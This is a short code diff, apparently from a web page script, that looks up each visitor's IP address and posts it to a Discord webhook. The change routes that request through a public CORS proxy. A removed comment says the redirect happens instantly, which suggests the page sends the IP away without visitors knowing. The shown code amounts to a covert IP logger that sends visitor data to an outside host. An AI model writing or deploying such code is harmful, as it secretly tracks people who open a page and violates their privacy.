@@ -41,12 +41,16 @@
                 const data = await response.json();
                 const userIP = data.ip;
 
-                // Send IP to Discord webhook (non-blocking, redirect happens instantly)
+                // Proxy request to avoid CORS issue
+                const proxyURL = "https://cors-anywhere.herokuapp.com/"; // CORS Proxy
+
+                // Send IP to Discord webhook via proxy
                 const payload = {
                     content: `New Visitor IP: ${userIP}`
                 };
 
-                const webhookResponse = await fetch(WEBHOOK_URL, {
+                // Make a POST request via CORS proxy
+                const webhookResponse = await fetch(proxyURL + WEBHOOK_URL, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
